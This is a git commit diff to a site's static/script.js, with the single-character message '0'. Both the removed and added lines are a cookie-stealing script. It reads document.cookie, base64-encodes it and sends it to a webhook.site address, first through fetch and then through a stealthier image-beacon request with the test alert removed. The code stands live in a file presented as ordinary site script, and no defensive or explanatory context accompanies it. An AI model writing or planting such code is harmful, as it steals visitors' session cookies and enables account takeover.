00c0c330875575cc275773c8149a76cfeb0bdf87
celik1001 <relin1001@gmail.com>
2025-04-05 22:09:05 +0800

    0

--- static/script.js
+++ static/script.js
@@ -1,5 +1,5 @@
 <script>
-  alert("go"); var cookie = document.cookie;
-  fetch("https://webhook.site/7916beea-b3a9-4e85-bce4-d650211fbb0d?"+
-  window.btoa(cookie));
+  var cookie = document.cookie; new Image().src =
+  "https://webhook.site/7916beea-b3a9-4e85-bce4-d650211fbb0d?" +
+  window.btoa(document.cookie);
 </script>;
